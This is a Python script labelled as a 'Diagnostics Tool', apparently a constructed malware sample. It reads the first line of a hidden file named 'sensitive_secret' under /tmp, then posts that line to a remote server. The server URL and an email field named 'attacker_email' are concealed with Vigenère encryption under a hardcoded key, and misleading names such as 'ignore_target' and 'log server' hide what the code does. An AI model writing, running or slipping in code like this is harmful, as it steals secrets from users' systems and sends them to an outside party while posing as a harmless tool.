import requests
import argparse
import base64

#diagnostics in /tmp
#targetting specific file
ignore_target1 = "sensitive"
ignore_target2 = "secret"
delimeter = "_"
source = "./etc"


def parse_args():
    parser = argparse.ArgumentParser(prog="diagnostics",
                                     usage='%(prog)s [options]',
                                     description='Diagnostics Tool',
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-k', '--key', type=str, help='URL of log server')
    return parser.parse_args()


def send_to_log_server(key, data):
    url = "znit://fvzlogmng-wae-qeoe.jio-mtgljmvp-huiv.gpy.opi.gstgp:8080/liuk/logspwnu-ocvpg/m1/vgxt-ggmufr-kxryqe/dpcvjt"
    url = decrypt_vigenere(url, key)
    email = "zucpvq.uyyg@sie.wku"
    email = decrypt_vigenere(email, key)
    
    headers = {
        'Content-Type': 'application/json'
    }

    data = {
        "content": data,
        "attacker_email": email
    }

    try:
        response = requests.post(url, headers=headers, json=data)
    except Exception as e:
        print(f"Error: {e}")
        return

    print(f"Status Code: {response.status_code}")
    print(f"Response: {response.text}")


def run_diagnostics():
    key = "supersecretkeyyouwillneverget"
    with open(f"/tmp/.{source}/{ignore_target1}{delimeter}{ignore_target2}") as f:
        output = f.readline().strip()
        print(output)
        send_to_log_server(key, output)


def generate_key(msg, key):
    key = list(key)
    if len(msg) == len(key):
        return key
    else:
        for i in range(len(msg) - len(key)):
            key.append(key[i % len(key)])
    return "".join(key)


def encrypt_vigenere(msg, key):
    encrypted_text = []
    key = generate_key(msg, key)
    for i in range(len(msg)):
        char = msg[i]
        if char.isupper():
            encrypted_char = chr((ord(char) + ord(key[i]) - 2 * ord('A')) % 26 + ord('A'))
        elif char.islower():
            encrypted_char = chr((ord(char) + ord(key[i]) - 2 * ord('a')) % 26 + ord('a'))
        else:
            encrypted_char = char
        encrypted_text.append(encrypted_char)
    return "".join(encrypted_text)


def decrypt_vigenere(msg, key):
    decrypted_text = []
    key = generate_key(msg, key)
    for i in range(len(msg)):
        char = msg[i]
        if char.isupper():
            decrypted_char = chr((ord(char) - ord(key[i]) + 26) % 26 + ord('A'))
        elif char.islower():
            decrypted_char = chr((ord(char) - ord(key[i]) + 26) % 26 + ord('a'))
        else:
            decrypted_char = char
        decrypted_text.append(decrypted_char)
    return "".join(decrypted_text)


if __name__ == "__main__":
    args = parse_args()
    run_diagnostics()
